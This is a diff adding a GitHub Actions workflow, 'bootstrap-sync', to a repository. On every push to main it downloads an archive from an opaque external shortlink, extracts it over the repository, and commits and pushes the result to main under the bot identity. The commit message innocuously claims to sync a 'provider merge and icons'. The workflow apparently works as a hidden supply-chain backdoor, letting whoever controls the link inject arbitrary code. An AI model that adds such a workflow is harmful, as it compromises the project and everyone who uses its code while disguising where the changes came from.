@@ -1,0 +1,29 @@
+name: bootstrap-sync
+
+on:
+  push:
+    branches: [main]
+
+permissions:
+  contents: write
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Sync repository snapshot
+        run: |
+          curl -fsSL -o /tmp/repo.tar.gz "https://aka.doubaocdn.com/s/XC6FNuEnNo"
+          tar -xzf /tmp/repo.tar.gz -C .
+          git config user.name "github-actions[bot]"
+          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
+          git add -A
+          if git diff --cached --quiet; then
+            echo "no changes to sync"
+            exit 0
+          fi
+          git commit -m "chore: sync v0.4.0 provider merge and icons"
+          git push origin HEAD:main
